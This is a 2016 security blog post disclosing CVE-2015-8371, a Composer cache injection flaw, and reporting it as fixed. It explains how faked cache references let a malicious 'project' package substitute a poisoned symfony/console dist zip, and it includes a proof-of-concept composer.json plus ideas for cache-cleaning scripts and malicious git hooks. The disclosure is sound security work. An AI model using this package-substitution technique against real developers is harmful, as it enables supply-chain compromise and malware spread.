<!doctype html>
<head>
  <meta charset="utf-8">
  <meta name="description" content="End of last year I analyzed composer for a few attack vectors, which make use of Packagist to target Projects with own Repositories.


wordpress


zend


magento (they support composer for magento 2 modules)

drupal


Surprisingly I found one Vector, which still produces a danger, even if you disable
the default packagist repository for your project.
">
  <meta name="author" content="Flyingmana">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Composer Cache Injection vulnerability - CVE-2015-8371 &mdash; Flyingmanas little World</title>
  <link type="image/png" href="/images/favicon.png" rel="icon"/>
  <link rel="stylesheet" type="text/css" href="https://flyingmana.de/css/styles.css" />
</head>
<body>
<!-- Google Tag Manager -->
<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-TN2C8S"
                  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        '//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-TN2C8S');</script>
<!-- End Google Tag Manager -->

  <div id="container">
    <header>
                <p class="site-title"><a href="https://flyingmana.de/">Flyingmanas little World</a></p>
            </header>
      <section id="nav" class="sidebar box" role="navigation">
            
<nav>

    <a class="blog-main-link" href="https://flyingmana.de/blog_de.html">Blog (german)</a>
    <span style="font-size: 0.8em;">(<a href="http://feeds.feedburner.com/FlyingmanasKleineWelt">RSS Feed</a>)</span>
        <a href="https://flyingmana.de/blog_de/tag/elenears-erben.html">Elenears Erben</a>
        <a href="https://flyingmana.de/blog_de/tag/magento.html">Magento</a>
        <a href="https://flyingmana.de/blog_de/tag/piecrust.html">PieCrust</a>
        <a href="https://flyingmana.de/blog_de/tag/wizards-fugue.html">Wizards Fugue</a>
        <a href="https://flyingmana.de/blog_de/tag/zeta-components.html">Zeta Components</a>
        <a href="https://flyingmana.de/blog_de/tag/blog.html">blog</a>
        <a href="https://flyingmana.de/blog_de/tag/javascript.html">javascript</a>
        <a href="https://flyingmana.de/blog_de/tag/linux.html">linux</a>
        <a href="https://flyingmana.de/blog_de/tag/netbeans.html">netbeans</a>
        <a href="https://flyingmana.de/blog_de/tag/performance.html">performance</a>
        <a href="https://flyingmana.de/blog_de/tag/php.html">php</a>
        <a href="https://flyingmana.de/blog_de/tag/wcv.html">wcv</a>
    
    <a class="blog-main-link" href="https://flyingmana.de/blog_en.html">Blog (english)</a>
    <span style="font-size: 0.8em;">(<a href="http://feeds.feedburner.com/FlyingmanasLittleWorld">RSS Feed</a>)</span>
    
        <a href="https://flyingmana.de/blog_en/tag/3d.html">3D</a>
        <a href="https://flyingmana.de/blog_en/tag/google.html">Google</a>
        <a href="https://flyingmana.de/blog_en/tag/magento.html">Magento</a>
        <a href="https://flyingmana.de/blog_en/tag/design.html">design</a>
        <a href="https://flyingmana.de/blog_en/tag/performance.html">performance</a>
        <a href="https://flyingmana.de/blog_en/tag/php.html">php</a>
        <a href="https://flyingmana.de/blog_en/tag/security.html">security</a>
    
    <!-- <a class="blog-main-link" href="https://flyingmana.de/microblog_de.html">Microblog (german)</a> -->
    <!--
        -->
    <a class="blog-main-link" href="http://flyingmana.name">imprint / Impressum</a>
</nav>
      </section>


    <section id="main" role="main">
                    
                <div class="content">
                <div class="post">
        <h2>Composer Cache Injection vulnerability - CVE-2015-8371</h2>
        <div class="post-meta">
            <span class="post-date">February 14, 2016&nbsp;</span>
                                                <span class="post-author">by <a href="https://plus.google.com/113709203377447920740?rel=author">Flyingmana</a></span>
                                                    &mdash;
            <span class="post-tags">
								<a href="https://flyingmana.de/blog_en/tag/magento.html">Magento</a>, 								<a href="https://flyingmana.de/blog_en/tag/php.html">php</a>, 								<a href="https://flyingmana.de/blog_en/tag/security.html">security</a>							</span>
                    </div>
    </div>
    <p>End of last year I analyzed composer for a few attack vectors, which make use of Packagist to target Projects with own Repositories.</p>
<ul>
<li>
<a href="http://wpackagist.org/">wordpress</a>
</li>
<li>
<a href="https://packages.zendframework.com/">zend</a>
</li>
<li>
<a href="https://www.magentocommerce.com/magento-connect/">magento</a> (they support composer for magento 2 modules)</li>
<li>
<a href="https://packagist.drupal-composer.org/">drupal</a>
</li>
</ul>
<p>Surprisingly I found one Vector, which still produces a danger, even if you <a href="https://getcomposer.org/doc/05-repositories.md#disabling-packagist">disable</a>
the default packagist repository for your project.</p>
<!-- more -->
<div class="content-attention">The Vulnerability was fixed on 10.02.2016 in the source of composer.</div>
<p>The source of the problem lies in the way composer cached dist packages.
The Cache Key was generated from the name of the package, the dist type,
and a “magical” reference, which got provided from the package repository
(packagist uses the commit hash here) and is easy to fake.</p>
<p>There are two easy ways to make use of this.<br />
The first one is directly via packagist, to add the package you want to use
for the attack, and which before only exists on the project specific
repository yet. And as cached packages have a ttl of 30 days, they will even
after removing them from the repository stay inside the cache for a while.</p>
<p>The second one is more interesting as it is easy to get people to install
a new hip composer project. I talk about the composer package type “project”,
as it allows some additional stuff, like usage of own repositories,
or even to directly define dist packages. So you can even replace packages,
existing on packagist.<br />
A likely target then would be the symfony/console package,
which is used by a lot of projects.</p>
<p>The evil thing about this attack is, it would even work when you
disable plugins and scripts for this run.
And making use of this options should normally remove every potential security threat.<br />
Btw. you should always disable both for new projects and packages you want to
try out or only looking at.</p>
<p>How would such an evil project look:</p>
<pre><code class="language-json">{
  &quot;name&quot;: &quot;evil/project&quot;,
  &quot;type&quot;: &quot;project&quot;,
  &quot;version&quot;: &quot;2.0.0&quot;,
    &quot;repositories&quot;: [
        {
            &quot;type&quot;: &quot;package&quot;,
            &quot;package&quot;: {
                &quot;name&quot;: &quot;symfony/console&quot;,
                &quot;version&quot;: &quot;v2.7.6&quot;,
                &quot;dist&quot;: {
                    &quot;url&quot;: &quot;http://127.0.0.5:7070/5efd632294c8320ea52492db22292ff853a43766.zip&quot;,
                    &quot;reference&quot;: &quot;5efd632294c8320ea52492db22292ff853a43766&quot;,
                    &quot;type&quot;: &quot;zip&quot;
                }
            }
        }
    ],
    &quot;require&quot;: {
        &quot;symfony/console&quot;: &quot;v2.7.6&quot;
    }
}
</code></pre>
<p>For extra evil you can add a <code>post-root-package-install</code> script to clean
the cache, as not everyone disables scripts.</p>
<p>Anyway, the attack would only work when the package is not already cached,
but having success in only one of 31 cases should be enough
for a package which has 40k daily installs. And one success allows for
more evil stuff to spread maleware into the developers ecosystem. Just imagine
a global git hook, which modifies pushes to github into non PR branches.</p>

        </div>
    </section>
    <footer>
                        <p>
            contact the <a href="http://flyingmana.name">author (Flyingmana)</a>
            <br/>
            find him on <a href="https://plus.google.com/113709203377447920740">Google+</a>
        </p>
        <p>Baked with a custom Fork of <em><a href="https://github.com/Flyingmana/PieCrust">PieCrust</a> 1.2.0-dev - customized</em>.</p>
    </footer>
  </div>
  <div id="design-helper-1"></div>
  <div id="design-helper-2"></div>
  <div id="design-helper-3"></div>
  <div id="design-helper-4"></div>
  <div id="design-helper-5"></div>
  <div id="design-helper-6"></div>
</body>
</html>
